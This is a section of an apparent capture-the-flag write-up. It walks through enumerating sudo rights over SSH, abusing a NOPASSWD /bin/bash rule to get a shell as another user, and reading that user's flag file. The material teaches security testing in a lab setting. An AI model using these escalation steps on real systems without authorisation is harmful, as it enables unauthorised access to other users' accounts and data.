### Section 10 — Lateral Privilege Escalation via `sudo`

* **Objective:** Enumerate `sudo` privileges assigned to `user1` after initial SSH access, pivot laterally to `user2` without a password, and retrieve the flag stored in `/home/user2/flag.txt`.

* **Steps & Commands:**
  1. **Initial SSH Access & `sudo` Privilege Enumeration:**
     ```bash
     ssh user1@<TARGET_IP> -p <PORT>
     sudo -l
     ```
     * **Finding:** Discovered that `user1` is permitted to execute `/bin/bash` as `user2` without a password (`(user2 : user2) NOPASSWD: /bin/bash`).

  2. **Lateral Pivot to `user2` & Flag Extraction:**
     ```bash
     sudo -u user2 /bin/bash
     whoami
     cat /home/user2/flag.txt
     ```
     * **Finding:** Successfully spawned an interactive Bash shell running under `user2` and read `/home/user2/flag.txt` to capture the flag (`HTB{REDACTED}`).

* **Takeaway:** Always run `sudo -l` immediately upon gaining shell access—misconfigured `NOPASSWD` entries for interactive binaries like `/bin/bash` allow direct horizontal or vertical privilege escalation to the target user context.
